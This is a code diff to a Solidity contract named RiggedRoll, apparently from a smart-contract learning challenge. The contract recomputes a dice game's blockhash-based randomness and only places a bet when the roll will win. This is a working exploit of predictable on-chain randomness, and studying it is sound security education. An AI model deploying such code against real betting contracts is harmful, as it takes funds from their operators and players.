@@ -21,7 +21,8 @@ contract RiggedRoll is Ownable {
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
     function riggedRoll() public {
-        uint256 minValue = 0.002 * 10 * 1000000000000000000;
+        require(address(this).balance >= .002 ether, "Not enough ether");
+        uint256 minValue = 2000000000000000;
         bytes32 prevHash = blockhash(block.number - 1);
         bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
         uint256 roll = uint256(hash) % 16;
@@ -30,12 +31,14 @@ contract RiggedRoll is Ownable {
         console.logBytes32(hash);
         console.log(address(diceGame));
 
+        require(roll <= 2, "Not a winning roll");
+
         // If roll > 2, don't roll the dice
         if (roll > 2) {
             return;
         }
 
-        diceGame.rollTheDice{value: 0.002 ether}();
+        diceGame.rollTheDice{value: minValue}();
     }
 
 
